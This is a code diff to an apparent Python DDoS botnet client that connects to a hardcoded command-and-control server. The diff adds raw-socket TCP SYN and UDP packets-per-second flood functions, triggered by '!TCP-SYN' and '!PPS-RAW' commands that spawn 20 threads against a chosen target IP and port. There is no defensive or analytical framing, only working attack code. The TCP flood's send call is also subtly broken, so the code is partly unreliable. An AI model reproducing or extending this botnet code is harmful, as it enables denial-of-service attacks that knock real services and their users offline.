@@ -1,7 +1,7 @@
 
-import socket, threading, time, random, requests, os
-
-
+import socket, threading, time, random, requests, os, subprocess
+from os import urandom
+from socket import IPPROTO_TCP
 
 C2_ADDRESS  = "87.106.232.239"
 C2_PORT     = 5555
@@ -62,10 +62,32 @@ def attack_udp_gbps(ip, port, end_time, size):
 
 
 
+def attack_tcp_syn(ip, port, end_time, size):
+    while time.time() < end_time:
+        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, IPPROTO_TCP)
+        try:
+            s.connect((ip, port))
+            while time.time() < end_time:
+                s.send(s, urandom(size))
+        except:
+            pass
+        finally:
+            s.close()
 
 
-
-
+def attack_pps(ip, port, end_time, size):
+    while time.time() < end_time:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            dport = random.randint(1, 65535) if port == 0 else port
+            data = b' ' * 64  
+            while time.time() < end_time:
+                s.sendto(data, (ip, dport))
+        except Exception as e:
+            print("Error:", e)
+            continue
+        finally:
+            s.close()
 
 #bypass attacks
 
@@ -207,6 +229,24 @@ def main():
                     threads = 20
                     for _ in range(threads):
                         threading.Thread(target=attack_udp_gbps, args=(ip, port, end_time, size), daemon=True).start()
+                if command == '!TCP-SYN':
+                    ip = args[1]
+                    port = int(args[2])
+                    duration = int(args[3])
+                    end_time = time.time() + duration
+                    size = 65500
+                    threads = 20
+                    for _ in range(threads):
+                        threading.Thread(target=attack_tcp_syn, args=(ip, port, end_time, size), daemon=True).start()
+                if command == '!PPS-RAW':
+                    ip = args[1]
+                    port = int(args[2])
+                    duration = int(args[3])
+                    end_time = time.time() + duration
+                    size = 65500
+                    threads = 20
+                    for _ in range(threads):
+                        threading.Thread(target=attack_pps, args=(ip, port, end_time, size), daemon=True).start()
                 elif command == 'PING':
                     c2.send('PONG'.encode())
             except:
